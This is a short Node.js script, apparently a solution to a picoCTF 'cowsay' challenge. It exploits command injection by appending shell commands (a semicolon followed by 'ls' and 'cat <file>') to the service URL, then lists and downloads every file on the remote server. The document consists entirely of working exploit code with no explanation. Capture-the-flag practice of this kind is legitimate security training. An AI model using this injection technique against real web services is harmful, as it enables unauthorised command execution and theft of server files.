
import fs    from 'fs';
import https from 'https';

const API = 'https://caas.mars.picoctf.net/cowsay/';

const list = (callback) => {

	let request = https.request(API + 'whatever;%20ls', {
		'Referer': API
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let payload = Buffer.concat(chunks);
			let headers = Buffer.from(JSON.stringify(response.headers, null, '\t'), 'utf8');

			let lines = payload.toString('utf8').split('\n').map((line) => line.trim());
			let index = lines.indexOf('||     ||');

			if (index !== -1) {

				let files = lines.slice(index + 1).filter((value) => value.trim() !== '');

				callback(files);

			} else {
				callback([]);
			}

		});

	});

	request.end();

};

const download = (file) => {

	let request = https.request(API + 'whatever;%20cat%20' + file, {
		'Referer': API
	}, (response) => {

		const chunks = [];

		response.on('data', (data) => chunks.push(data));
		response.on('end', () => {

			let payload = Buffer.concat(chunks);
			let headers = Buffer.from(JSON.stringify(response.headers, null, '\t'), 'utf8');
			let content = payload.toString('utf8');

			let index = content.indexOf('||     ||');
			if (index !== -1) {

				content = content.substr(index + 9);
				fs.writeFileSync('challenge/' + file, content);

			}

		});

	});

	request.end();

};


list((files) => {

	console.log('Found these files:');

	files.forEach((file) => {

		if (file.includes('.')) {
			console.log('> Download "' + file + '" ...');
			download(file);
		} else {
			console.log('> Ignore folder "' + file + '"');
		}

	});

});
